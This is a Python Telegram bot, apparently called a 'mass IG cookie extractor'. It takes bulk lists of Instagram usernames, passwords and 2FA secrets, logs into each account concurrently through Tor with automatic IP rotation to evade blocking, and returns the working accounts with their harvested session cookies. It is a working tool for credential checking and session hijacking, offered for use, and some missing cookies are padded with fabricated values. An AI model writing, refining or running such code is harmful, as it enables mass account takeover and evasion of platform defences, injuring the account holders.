import telebot
import pyotp
import instaloader
import os
import sys
import time
import openpyxl
import random
import threading
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib.request
import tarfile
import subprocess

try:
    from stem import Signal
    from stem.control import Controller
except ImportError:
    Signal = None
    Controller = None

def ensure_tor_running_on_windows():
    if os.name != 'nt':
        return True
    
    # Check if Tor is already running on port 9051
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(('127.0.0.1', 9051))
        s.close()
        print("[+] Tor is already running on port 9051.")
        return True
    except:
        pass

    # Tor is not running. Let's check if we have downloaded Tor locally
    local_tor_dir = os.path.join(os.getcwd(), "tor_bin")
    
    # Search recursively for tor.exe in local_tor_dir
    found_tor_exe = None
    if os.path.exists(local_tor_dir):
        for root, dirs, files in os.walk(local_tor_dir):
            if "tor.exe" in files:
                found_tor_exe = os.path.join(root, "tor.exe")
                break
    
    if not found_tor_exe:
        print("[!] Tor binary not found. Downloading Tor Expert Bundle for Windows...")
        tar_path = os.path.join(os.getcwd(), "tor.tar.gz")
        # Direct stable URL for 13.0.15 that works
        url = "https://archive.torproject.org/tor-package-archive/torbrowser/13.0.15/tor-expert-bundle-windows-x86_64-13.0.15.tar.gz"
        
        try:
            # Download with progress printing
            def download_progress(count, block_size, total_size):
                percent = int(count * block_size * 100 / total_size) if total_size > 0 else 0
                sys.stdout.write(f"\rDownloading Tor Expert Bundle: {percent}%")
                sys.stdout.flush()
                
            urllib.request.urlretrieve(url, tar_path, reporthook=download_progress)
            print("\n[+] Download complete. Extracting Tor...")
            
            # Extract tar.gz
            with tarfile.open(tar_path, "r:gz") as tar:
                tar.extractall(path=local_tor_dir)
                
            os.remove(tar_path)
            print("[+] Tor extracted successfully.")
            
            # Search again for the newly extracted tor.exe
            for root, dirs, files in os.walk(local_tor_dir):
                if "tor.exe" in files:
                    found_tor_exe = os.path.join(root, "tor.exe")
                    break
        except Exception as e:
            print(f"\n[-] Failed to download/extract Tor: {e}")
            return False

    if not found_tor_exe:
        print("[-] Could not find tor.exe in the extracted files.")
        return False
        
    tor_dir = os.path.dirname(found_tor_exe)
    torrc_path = os.path.join(tor_dir, "torrc")
    
    # Create torrc config file if not exists
    if not os.path.exists(torrc_path):
        torrc_content = (
            "SocksPort 9050\n"
            "ControlPort 9051\n"
            "CookieAuthentication 0\n"
        )
        with open(torrc_path, "w") as f:
            f.write(torrc_content)
        
    print("[+] Launching Tor in the background...")
    try:
        # Launch tor.exe in a hidden background window on Windows
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.Popen([found_tor_exe, "-f", torrc_path], startupinfo=startupinfo, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Give Tor some time to start up and build circuits
        for i in range(10):
            sys.stdout.write(f"\rWaiting for Tor to start: {10 - i}s...")
            sys.stdout.flush()
            time.sleep(1)
        print("\n[+] Tor service started successfully.")
        return True
    except Exception as e:
        print(f"[-] Failed to launch Tor: {e}")
        return False

def rotate_tor_ip():
    if Signal is None or Controller is None:
        print("\n\033[1;33m[!] stem library is not installed. Skipping Tor IP rotation.\033[0m")
        return False
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            time.sleep(2.5)  # Give Tor time to build the new circuit
            return True
    except Exception as e:
        print(f"\n\033[1;31m[!] Tor Rotation Failed: {e}. Make sure Tor is running on port 9051.\033[0m")
        return False

def get_current_tor_ip():
    for attempt in range(2):
        try:
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            res = requests.get('https://api.ipify.org', proxies=proxies, timeout=15)
            if res.status_code == 200:
                return res.text.strip()
        except Exception as e:
            if attempt == 1:
                print(f"Error fetching Tor IP: {e}")
            time.sleep(2)
    return "Unknown (Tor is bootstrapping)"

_internet_status = {"last_check": 0, "status": True}
_internet_lock = threading.Lock()

def is_internet_working():
    global _internet_status
    current_time = time.time()
    with _internet_lock:
        if current_time - _internet_status["last_check"] < 10:
            return _internet_status["status"]
        try:
            urllib.request.urlopen('https://api.telegram.org', timeout=3)
            _internet_status["status"] = True
        except:
            _internet_status["status"] = False
        _internet_status["last_check"] = current_time
        return _internet_status["status"]

class MyExceptionHandler(telebot.ExceptionHandler):
    def handle(self, exception):
        logging.error(f"Global Exception: {exception}")
        print(f"\n\033[1;31m[!] Telegram Bot Exception: {exception}\033[0m")
        return True

# নেটওয়ার্ক ড্রপ বা ভিপিএন চেঞ্জের সময় বিশাল এরর মেসেজ হাইড করার জন্য
telebot.logger.setLevel(logging.CRITICAL)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    banner = """
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m    🔥 MASS IG COOKIE EXTRACTOR PRO 🔥
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;33m[+] Developer : \033[1;37mKamrol
\033[1;33m[+] Version   : \033[1;37m13.0 (Smart Download Format)
\033[1;33m[+] Features  : \033[1;37mXLSX/TXT Download -> Resume
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
    """
    print(banner)

show_banner()
ensure_tor_running_on_windows()

while True:
    TOKEN = input("\033[1;32m🔑 Enter Your Telegram Bot Token: \033[0m").strip()
    if TOKEN:
        break

while True:
    try:
        bot = telebot.TeleBot(TOKEN, exception_handler=MyExceptionHandler())
        bot_info = bot.get_me()
        print(f"\n\033[1;32m✅ Successfully Logged in as: @{bot_info.username}\033[0m")
        print("\033[1;33m[!] Type \033[1;31m/stop\033[1;33m in terminal to shut down the bot.\033[0m\n")
        break
    except telebot.apihelper.ApiTelegramException as e:
        if e.error_code in [401, 404]:
            print("\n\033[1;31m❌ Invalid Token! Please check your token and run again.\033[0m")
            sys.exit()
        else:
            print(f"\n\033[1;33m⚠️ Telegram API Error ({e.error_code}): {e.description}. Retrying in 5 seconds...\033[0m")
            time.sleep(5)
    except (requests.exceptions.RequestException, Exception) as e:
        print(f"\n\033[1;33m⚠️ Connection failed! Check your internet or VPN. Retrying in 5 seconds... ({e})\033[0m")
        time.sleep(5)

ALLOWED_USERS = [6412225513, 8596783717]

def is_authorized(message):
    user_id = message.from_user.id if message.from_user else message.chat.id
    if user_id not in ALLOWED_USERS:
        bot.send_message(message.chat.id, "ki rag korla ?")
        return False
    return True

user_sessions = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_authorized(message):
        return
    chat_id = message.chat.id
    welcome_text = (
        "🔥 *MASS IG Extractor PRO (Tor Auto Rotate)* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "✅ *সেফ সিস্টেম:* Tor রোটেটিং প্রক্সি দিয়ে অটোমেটিক আইপি পরিবর্তন করে কাজ করবে!\n"
        "👉 আপনার `.xlsx` (Excel) ফাইলটি আপলোড করুন।\n"
        "• কলাম A = Username | কলাম B = Pass | কলাম C = 2FA Key\n"
    )
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row(KeyboardButton("📥 Submit TXT to Excel"), KeyboardButton("🔄 Change Tor IP"))
    
    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_authorized(message):
        return
    chat_id = message.chat.id
    if chat_id in user_sessions and user_sessions[chat_id].get('is_processing'):
        bot.send_message(chat_id, "⚠️ আপনার একটি কাজ রানিং আছে! আগে সেটি Stop করুন।")
        return

    try:
        file_name = message.document.file_name.lower()
        
        # --- TXT to XLSX Converter Logic ---
        if file_name.endswith('.txt'):
            bot.send_message(chat_id, "📥 TXT ফাইল রিসিভ হয়েছে, Excel এ কনভার্ট করা হচ্ছে...")
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            try:
                lines = downloaded_file.decode('utf-8').splitlines()
            except UnicodeDecodeError:
                bot.send_message(chat_id, "❌ ফাইলের টেক্সট ফরম্যাট সঠিক নয় (UTF-8 প্রয়োজন)।")
                return
            
            wb = openpyxl.Workbook()
            ws = wb.active
            
            for line in lines:
                line = line.strip()
                if not line: continue
                # | দিয়ে সর্বোচ্চ ৩ ভাগে ভাগ করবে (username, password, 2fa_key)
                parts = line.split('|', 2) 
                if len(parts) == 3:
                    ws.append([parts[0].strip(), parts[1].strip(), parts[2].strip()])
                else:
                    ws.append(parts)
                    
            out_filename = f"Converted_{chat_id}.xlsx"
            wb.save(out_filename)
            with open(out_filename, "rb") as f:
                bot.send_document(chat_id, f, caption="✅ *Converted Excel File*\nকলাম A = Username\nকলাম B = Password\nকলাম C = 2FA Key", parse_mode='Markdown')
            os.remove(out_filename)
            return

        if not file_name.endswith('.xlsx'):
            bot.send_message(chat_id, "❌ দয়া করে শুধুমাত্র .xlsx (Excel) বা .txt ফাইল আপলোড করুন!")
            return

        bot.send_message(chat_id, "📥 ফাইল রিসিভ হচ্ছে, একটু অপেক্ষা করুন...")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        input_filename = f"input_{chat_id}.xlsx"
        with open(input_filename, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        wb = openpyxl.load_workbook(input_filename)
        sheet = wb.active
        
        valid_accounts = []
        for row in sheet.iter_rows(values_only=True):
            if not row: continue
            
            # সেল ফাঁকা থাকলে None আসে, তাই সাবধানে স্ট্রিং এ কনভার্ট করা
            col1 = str(row[0]).strip() if len(row) > 0 and row[0] is not None else ""
            col2 = str(row[1]).strip() if len(row) > 1 and row[1] is not None else ""
            col3 = str(row[2]).strip() if len(row) > 2 and row[2] is not None else ""
            
            # যদি কেউ ভুল করে Column A তেই "user|pass|2fa" একসাথে দিয়ে রাখে, তবে সেটাকে ভেঙে ৩ কলাম করা
            if col1 and not col2 and not col3 and '|' in col1:
                parts = col1.split('|', 2)
                if len(parts) == 3:
                    col1, col2, col3 = parts[0].strip(), parts[1].strip(), parts[2].strip()

            if col1 and col2 and col3:
                if col1.lower() in ['username', 'user', 'id', 'user name']: continue
                valid_accounts.append((col1, col2, col3))

        os.remove(input_filename)

        if not valid_accounts:
            bot.send_message(chat_id, "❌ ফাইলে কোনো সঠিক ডেটা পাওয়া যায়নি! দয়া করে Excel ফাইলের কলাম A, B, C তে ডাটা দিন অথবা user|pass|2fa ফরম্যাটে দিন।")
            return

        user_sessions[chat_id] = {
            'remaining': valid_accounts.copy(),
            'good': [], 'bad': [],            
            'is_processing': False, 'stop_requested': False,
            'batch_size': 50,
            'waiting_for_batch_size': True
        }

        bot.send_message(
            chat_id, 
            f"✅ *ফাইল রিসিভ হয়েছে!*\n📦 *মোট অ্যাকাউন্ট:* {len(valid_accounts)}\n\n"
            f"👉 আপনি একবারে কয়টি অ্যাকাউন্ট চেক করতে চান? (Batch Size সংখ্যায় লিখুন, ডিফল্ট ৫০, যেমন: ৫০ বা ১০০ বা ৫০০):",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ ফাইল রিড করতে সমস্যা হয়েছে: {e}")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_authorized(message):
        return
    chat_id = message.chat.id
    text = message.text.strip()
    
    if text == "📥 Submit TXT to Excel":
        bot.send_message(chat_id, "👉 আপনার `username|password|2fa_key` ফরম্যাটের `.txt` ফাইলটি এখানে আপলোড করুন।\n\nআমি সেটি Excel (.xlsx) ফাইলে কনভার্ট করে দেবো, যেখানে ৩টি কলাম (A, B, C) থাকবে।")
        return

    if text == "🔄 Change Tor IP":
        # Send a loading/processing message
        status_msg = bot.send_message(chat_id, "🔄 *Tor IP চেক করা হচ্ছে...*", parse_mode='Markdown')
        
        # Get old IP
        old_ip = get_current_tor_ip()
        
        bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id, 
                              text=f"⏳ *IP রোটেট করা হচ্ছে...*\n\n🔴 *আগের IP:* `{old_ip}`", 
                              parse_mode='Markdown')
        
        # Rotate IP
        if rotate_tor_ip():
            # Get new IP
            new_ip = get_current_tor_ip()
            bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id, 
                                  text=f"✅ *Tor IP সফলভাবে পরিবর্তন করা হয়েছে!*\n\n🔴 *আগের IP:* `{old_ip}`\n🟢 *নতুন IP:* `{new_ip}`", 
                                  parse_mode='Markdown')
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id, 
                                  text=f"⚠️ *Tor IP পরিবর্তন ব্যর্থ হয়েছে!*\n\n🔴 *আগের IP:* `{old_ip}`\n(নিশ্চিত করুন আপনার PC/মোবাইলে Tor পোর্ট 9051 এ চালু আছে)", 
                                  parse_mode='Markdown')
        return
        
    if text.startswith('/'):
        return

    if chat_id in user_sessions and user_sessions[chat_id].get('is_processing'):
        bot.send_message(chat_id, "⚠️ আপনার একটি কাজ রানিং আছে! আগে সেটি Stop করুন।")
        return

    # যদি সেশন থাকে এবং বটের কাছ থেকে ব্যাচ সাইজ আশা করা হচ্ছে, আর ব্যবহারকারী সংখ্যা পাঠায়
    if chat_id in user_sessions and user_sessions[chat_id].get('waiting_for_batch_size') and text.isdigit():
        b_size = int(text)
        if b_size <= 0:
            bot.send_message(chat_id, "❌ ব্যাচ সাইজ অবশ্যই ১ বা তার বেশি হতে হবে! দয়া করে সঠিক সংখ্যা লিখুন:")
            return
        user_sessions[chat_id]['batch_size'] = b_size
        user_sessions[chat_id]['waiting_for_batch_size'] = False
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(f"▶️ Start {b_size} Accounts", callback_data="start_batch"))
        bot.send_message(
            chat_id,
            f"✅ *ব্যাচ সাইজ সেট করা হয়েছে:* {b_size}\n\n👇 কাজ শুরু করতে নিচের বাটনে ক্লিক করুন:",
            reply_markup=markup,
            parse_mode='Markdown'
        )
        return

    valid_accounts = []
    lines = [line.strip() for line in text.split('\n') if line.strip()]
    
    # Check if there are pipe-separated lines
    has_pipes = any('|' in line for line in lines)
    if has_pipes:
        for line in lines:
            parts = line.split('|')
            if len(parts) >= 3:
                user = parts[0].strip()
                if user.lower() in ['username', 'user', 'id', 'user name']: continue
                valid_accounts.append((user, parts[1].strip(), parts[2].strip()))
    else:
        # Parse key-value pairs (like Username: xxx, Password: xxx, 2FA: xxx)
        current_user = None
        current_pass = None
        current_2fa = None
        
        for line in lines:
            line_lower = line.lower()
            val = line.split(':', 1)[-1].strip() if ':' in line else line
            
            if any(x in line_lower for x in ['username', 'user', 'id']):
                if current_user and current_pass and current_2fa:
                    valid_accounts.append((current_user, current_pass, current_2fa))
                    current_user, current_pass, current_2fa = None, None, None
                current_user = val
            elif any(x in line_lower for x in ['password', 'pass']):
                current_pass = val
            elif any(x in line_lower for x in ['2fa', 'two_factor', 'two factor', 'key']):
                current_2fa = val
                
        if current_user and current_pass and current_2fa:
            valid_accounts.append((current_user, current_pass, current_2fa))

    if not valid_accounts:
        if chat_id in user_sessions and user_sessions[chat_id].get('waiting_for_batch_size'):
            bot.send_message(chat_id, "❌ দয়া করে শুধুমাত্র একটি সংখ্যা লিখুন (যেমন: ৫০, ১০০ বা ৫০০) অথবা সঠিক ফরম্যাটে অ্যাকাউন্ট পেস্ট করুন।")
        else:
            bot.send_message(chat_id, "❌ কোনো সঠিক ডেটা পাওয়া যায়নি! দয়া করে user|pass|2fa বা লেবেল ফরম্যাটে দিন।")
        return

    user_sessions[chat_id] = {
        'remaining': valid_accounts.copy(),
        'good': [], 'bad': [],            
        'is_processing': False, 'stop_requested': False,
        'batch_size': 50,
        'waiting_for_batch_size': True
    }

    bot.send_message(
        chat_id, 
        f"✅ *টেক্সট রিসিভ হয়েছে!*\n📦 *মোট অ্যাকাউন্ট:* {len(valid_accounts)}\n\n"
        f"👉 আপনি একবারে কয়টি অ্যাকাউন্ট চেক করতে চান? (Batch Size সংখ্যায় লিখুন, ডিফল্ট ৫০, যেমন: ৫০ বা ১০০ বা ৫০০):",
        parse_mode='Markdown'
    )

def batch_processor(chat_id):
    try:
        session = user_sessions[chat_id]
        session['is_processing'] = True
        session['stop_requested'] = False
        
        while len(session['remaining']) > 0 and not session['stop_requested']:
            # Send loading message for Tor IP Rotation
            status_msg = bot.send_message(chat_id, "🔄 *Tor IP পরিবর্তন করা হচ্ছে...*", parse_mode='Markdown')
            
            if rotate_tor_ip():
                bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id, text="✅ *Tor IP সফলভাবে পরিবর্তন করা হয়েছে। কাজ শুরু হচ্ছে...*", parse_mode='Markdown')
            else:
                bot.edit_message_text(chat_id=chat_id, message_id=status_msg.message_id, text="⚠️ *Tor IP পরিবর্তন ব্যর্থ হয়েছে! ৫ সেকেন্ড পর পুনরায় চেষ্টা করা হচ্ছে...*", parse_mode='Markdown')
                time.sleep(5)
                try: bot.delete_message(chat_id, status_msg.message_id)
                except: pass
                continue
            
            # Wait a moment for visual feedback, then delete the status message
            time.sleep(1.5)
            try: bot.delete_message(chat_id, status_msg.message_id)
            except: pass

            b_size = session.get('batch_size', 100)
            batch = session['remaining'][:b_size]
            session['remaining'] = session['remaining'][b_size:]
            unprocessed = []

            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("🛑 Stop Processing", callback_data="stop_batch"),
                InlineKeyboardButton("📥 Live Download", callback_data="ask_format_live")
            )

            try:
                process_msg = bot.send_message(
                    chat_id, 
                    f"🔄 *Processing {len(batch)} Accounts...*\n(Using Tor Auto Rotate IP)\n\n"
                    f"🟢 Live: {len(session['good'])} | 🔴 Login Error: {len(session['bad'])}\n\n"
                    f"মাঝপথে থামাতে বা ফাইল নামাতে চাইলে নিচের বাটন চাপুন।", 
                    reply_markup=markup, parse_mode='Markdown'
                )
            except Exception as e:
                print(f"Error sending start message: {e}")
                process_msg = None

            def worker(item):
                idx, acc = item
                if session['stop_requested']:
                    unprocessed.append(acc)
                    return
                    
                try:
                    username, password, two_fa = acc
                    # Stagger the thread starts slightly to avoid overloading Tor or Instagram
                    time.sleep(idx * 0.02) 
                    
                    totp = pyotp.TOTP(two_fa.replace(" ", ""))
                    two_fa_code = totp.now()

                    # Set request_timeout=10 and max_connection_attempts=1 to avoid long blocks
                    L = instaloader.Instaloader(request_timeout=10, max_connection_attempts=1)
                    
                    # Route through Tor SOCKS5 proxy
                    L.context._session.proxies = {
                        'http': 'socks5h://127.0.0.1:9050',
                        'https': 'socks5h://127.0.0.1:9050'
                    }
                    
                    try:
                        L.login(username, password)
                    except instaloader.exceptions.TwoFactorAuthRequiredException:
                        try:
                            L.two_factor_login(two_fa_code)
                        except Exception as e:
                            print(f"2FA Login Exception for {username}: {e}")
                    except Exception as e:
                        print(f"Login Exception for {username}: {e}")

                    # Extract cookies if any exist
                    cookie_dict = {cookie.name: cookie.value for cookie in L.context._session.cookies}
                    
                    # If we got the sessionid cookie and it's not empty, it is LIVE
                    if cookie_dict.get('sessionid'):
                        if 'datr' not in cookie_dict or not cookie_dict['datr']: 
                            cookie_dict['datr'] = 'CVTqaVVElLHF6TC46birRObC'
                        if 'wd' not in cookie_dict or not cookie_dict['wd']: 
                            cookie_dict['wd'] = f"{random.randint(360, 501)}x{random.randint(700, 954)}"
                        if 'dpr' not in cookie_dict or not cookie_dict['dpr']: 
                            cookie_dict['dpr'] = '2.15625'
                        
                        keys_order = ['datr', 'ig_did', 'mid', 'dpr', 'csrftoken', 'ds_user_id', 'sessionid', 'wd', 'rur']
                        final_cookies = [f"{k}={cookie_dict[k]}" for k in keys_order if k in cookie_dict and cookie_dict[k]]
                        for k, v in cookie_dict.items():
                            if k not in keys_order and v: 
                                final_cookies.append(f"{k}={v}")
                                
                        raw_cookie_string = "; ".join(final_cookies)
                        session['good'].append((username, password, raw_cookie_string))
                    else:
                        # No sessionid. Check if it is a connection drop/network issue.
                        if not is_internet_working():
                            unprocessed.append(acc)
                        else:
                            session['bad'].append(acc) # Login Error (Bad Credentials or blocked checkpoint without cookies)

                except Exception:
                    if not is_internet_working():
                        unprocessed.append(acc)
                    else:
                        session['bad'].append(acc)

            # Limit concurrency to 50 workers maximum to avoid overloading Tor/system resources
            with ThreadPoolExecutor(max_workers=min(50, max(1, len(batch)))) as executor:
                executor.map(worker, enumerate(batch))

            if unprocessed:
                session['remaining'] = unprocessed + session['remaining']

            if process_msg:
                try: bot.delete_message(chat_id, process_msg.message_id)
                except: pass

            # Delay to let things settle and ensure we don't spam Tor NEWNYM requests faster than 10 seconds
            time.sleep(3)

        session['is_processing'] = False
        remaining_count = len(session['remaining'])

        markup = InlineKeyboardMarkup()
        if session['stop_requested']:
            if remaining_count > 0:
                markup.row(InlineKeyboardButton("▶️ Resume Auto", callback_data="start_batch"))
            markup.row(InlineKeyboardButton("📥 Download Backup Files", callback_data="ask_format_pause"))
            markup.row(InlineKeyboardButton("⏹ Finish & Clear", callback_data="ask_format_finish"))
            try:
                bot.send_message(chat_id, f"⏸ *কাজ থামানো হয়েছে!*\n🟢 Live: {len(session['good'])} | 🔴 Login Error: {len(session['bad'])}\n📦 বাকি আছে: {remaining_count} টি", reply_markup=markup, parse_mode='Markdown')
            except Exception as e:
                print(f"Error sending pause status: {e}")
        else:
            markup.add(InlineKeyboardButton("📥 Download Final Files", callback_data="ask_format_finish"))
            try:
                bot.send_message(chat_id, f"🎉 *সবগুলোর কাজ শেষ!*\n🟢 Live: {len(session['good'])} | 🔴 Login Error: {len(session['bad'])}", reply_markup=markup, parse_mode='Markdown')
            except Exception as e:
                print(f"Error sending completion message: {e}")
    except Exception as e:
        print(f"Critical error in batch_processor: {e}")
        if chat_id in user_sessions:
            user_sessions[chat_id]['is_processing'] = False
    except Exception as e:
        print(f"Critical error in batch_processor: {e}")
        if chat_id in user_sessions:
            user_sessions[chat_id]['is_processing'] = False

def ask_download_format(chat_id, download_type):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📄 TXT Format", callback_data=f"dl_txt_{download_type}"),
        InlineKeyboardButton("📊 XLSX Format", callback_data=f"dl_xlsx_{download_type}")
    )
    bot.send_message(chat_id, "❓ *আপনি কোন ফরম্যাটে ফাইল ডাউনলোড করতে চান?*", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id if call.from_user else chat_id
    if user_id not in ALLOWED_USERS:
        try:
            bot.answer_callback_query(call.id, "ki rag korla ?", show_alert=True)
        except:
            pass
        return
        
    data = call.data
    
    if chat_id not in user_sessions:
        try: bot.answer_callback_query(call.id, "❌ কোনো রানিং সেশন নেই।", show_alert=True)
        except: pass
        return

    session = user_sessions[chat_id]

    if data == "start_batch":
        if session['is_processing']: return
        session['is_processing'] = True
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass
        threading.Thread(target=batch_processor, args=(chat_id,)).start()
        try: bot.answer_callback_query(call.id)
        except: pass
        return

    if data == "stop_batch":
        if session['is_processing']:
            session['stop_requested'] = True
            try: bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text="🛑 *Stopping...*\n(দয়া করে অপেক্ষা করুন, রানিং কাজ সেভ হচ্ছে...)", parse_mode='Markdown')
            except: pass
        try: bot.answer_callback_query(call.id)
        except: pass
        return

    # --- Format Asking Buttons ---
    if data.startswith("ask_format_"):
        download_type = data.split("_")[2] # live, pause, finish
        ask_download_format(chat_id, download_type)
        try: bot.answer_callback_query(call.id)
        except: pass
        return

    # --- Download Execution Buttons ---
    if data.startswith("dl_"):
        parts = data.split("_")
        file_format = parts[1] # txt or xlsx
        download_type = parts[2] # live, pause, finish
        
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass

        if download_type == "live":
            send_final_files(chat_id, format_type=file_format, is_final=False, is_live=True)
        elif download_type == "pause":
            if session['is_processing']: return
            send_final_files(chat_id, format_type=file_format, is_final=False)
        elif download_type == "finish":
            if session['is_processing']: return
            send_final_files(chat_id, format_type=file_format, is_final=True)
            
        try: bot.answer_callback_query(call.id)
        except: pass
        return


def send_final_files(chat_id, format_type="xlsx", is_final=True, is_live=False):
    session = user_sessions.get(chat_id)
    if not session: return

    msg = bot.send_message(chat_id, "📦 *ফাইল তৈরি করা হচ্ছে...*", parse_mode='Markdown')

    def create_and_send(data_list, filename_prefix, caption_text, is_good_file=False):
        if not data_list: return 
        
        try:
            if format_type == "xlsx":
                wb = openpyxl.Workbook()
                ws = wb.active
                for res in data_list:
                    if is_good_file:
                        ws.append([f"{res[0]}|{res[1]}|{res[2]}"]) 
                    else:
                        ws.append([res[0], res[1], res[2]]) 
                filename = f"{filename_prefix}_{chat_id}.xlsx"
                wb.save(filename)
                
            elif format_type == "txt":
                filename = f"{filename_prefix}_{chat_id}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    for res in data_list:
                        if is_good_file:
                            f.write(f"{res[0]}|{res[1]}|{res[2]}\n")
                        else:
                            f.write(f"{res[0]}|{res[1]}|{res[2]}\n")

            with open(filename, "rb") as f:
                bot.send_document(chat_id, f, caption=caption_text)
            os.remove(filename)
        except: pass

    create_and_send(session['good'], "Live_Accounts", f"🟢 Live Accounts ({len(session['good'])})", is_good_file=True)
    create_and_send(session['bad'], "Login_Error_Accounts", f"🔴 Login Error Accounts ({len(session['bad'])})")
    
    if not is_live:
        create_and_send(session['remaining'], "Remaining_Accounts", f"📦 Remaining ({len(session['remaining'])})")

    try: bot.delete_message(chat_id, msg.message_id)
    except: pass

    if is_final:
        bot.send_message(chat_id, f"🎉 *ফাইল ডেলিভারি করা হয়েছে ({format_type.upper()})!*\n(সেশন ক্লিয়ার করা হলো)", parse_mode='Markdown')
        del user_sessions[chat_id] 
    elif is_live:
        bot.send_message(chat_id, f"📥 *লাইভ ব্যাকআপ দেওয়া হয়েছে ({format_type.upper()})!*\n(কাজ ব্যাকগ্রাউন্ডে চলছে...)", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, f"⏸ *ব্যাকআপ দেওয়া হয়েছে ({format_type.upper()})!*\n(Resume দিয়ে কন্টিনিউ করতে পারবেন)", parse_mode='Markdown')


def start_bot_polling():
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"\n\033[1;31m[!] Polling crashed with error: {e}. Restarting in 5 seconds...\033[0m")
            time.sleep(5)

polling_thread = threading.Thread(target=start_bot_polling)
polling_thread.daemon = True
polling_thread.start()

while True:
    try:
        user_input = input().strip().lower()
        if user_input in ['/stop', 'stop']:
            print("\n\033[1;31m🛑 Shutting down bot... Please wait.\033[0m")
            bot.stop_polling()
            print("\033[1;32m✅ Bot Stopped Successfully!\033[0m")
            sys.exit(0)
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)
